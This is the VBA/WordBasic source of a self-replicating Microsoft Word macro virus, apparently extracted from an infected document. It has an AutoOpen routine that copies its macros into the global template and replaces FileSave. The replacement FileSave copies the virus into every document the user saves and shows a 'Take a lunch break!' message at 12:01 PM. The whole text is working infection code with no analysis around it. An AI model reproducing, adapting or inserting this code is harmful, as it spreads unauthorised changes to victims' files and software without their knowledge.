   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim iMacroCount
   Dim i
   Dim bTooMuchTrouble
   Dim sMe$
   Dim sMacro$
       On Error GoTo -1: On Error GoTo Abort
       iMacroCount = WordBasic.CountMacros(0, 0)
       For i = 1 To iMacroCount
           If WordBasic.[MacroName$](i, 0, 0) = "FileSave" Then
               bTooMuchTrouble = -1
           End If
       Next i
       If Not bTooMuchTrouble Then
           'add FileSaveAs and copies of AutoOpen and FileSaveAs.
           sMe$ = WordBasic.[FileName$]()
           sMacro$ = sMe$ + ":NEWFS"
           WordBasic.MacroCopy sMacro$, "Global:FileSave"
           sMacro$ = sMe$ + ":NEWFS"
           WordBasic.MacroCopy sMacro$, "Global:NEWFS"
           sMacro$ = sMe$ + ":NEWAO"
           WordBasic.MacroCopy sMacro$, "Global:NEWAO"
       End If
   Abort:
   End Sub

   Attribute VB_Name = "NEWFS"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   'this becomes the FileSaveAs for the global template
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Bail
   WordBasic.CurValues.FileSaveAs dlg
   If InStr(WordBasic.[FileName$](), "\") = 0 Then
       WordBasic.Dialog.FileSaveAs dlg
       sMe$ = WordBasic.[FileNameInfo$](dlg.Name, 1)
       WordBasic.FileSaveAs dlg
   Else
       sMe$ = WordBasic.[FileName$]()
   End If
   If dlg.Format = 0 Then dlg.Format = 1
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:NEWAO", sTMacro$
   sTMacro$ = sMe$ + ":NEWAO"
   WordBasic.MacroCopy "Global:NEWAO", sTMacro$
   sTMacro$ = sMe$ + ":NEWFS"
   WordBasic.MacroCopy "Global:NEWFS", sTMacro$
   If WordBasic.[Time$]() = "12:01 PM" Then
       WordBasic.MsgBox "Whatya doin' here? Take a lunch break!", "Lunch Time!", 48
   End If
   WordBasic.FileSaveAs dlg
   GoTo Done

   Bail:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   Done:
   End Sub

   Attribute VB_Name = "NEWAO"

   Public Sub MAIN()
   Dim iMacroCount
   Dim i
   Dim bTooMuchTrouble
   Dim sMe$
   Dim sMacro$
       On Error GoTo -1: On Error GoTo Abort
       iMacroCount = WordBasic.CountMacros(0, 0)
       For i = 1 To iMacroCount
           If WordBasic.[MacroName$](i, 0, 0) = "FileSave" Then
               bTooMuchTrouble = -1
           End If
       Next i
       If Not bTooMuchTrouble Then
           'add FileSaveAs and copies of AutoOpen and FileSaveAs.
           sMe$ = WordBasic.[FileName$]()
           sMacro$ = sMe$ + ":NEWFS"
           WordBasic.MacroCopy sMacro$, "Global:FileSave"
           sMacro$ = sMe$ + ":NEWFS"
           WordBasic.MacroCopy sMacro$, "Global:NEWFS"
           sMacro$ = sMe$ + ":NEWAO"
           WordBasic.MacroCopy sMacro$, "Global:NEWAO"
       End If
   Abort:
   End Sub
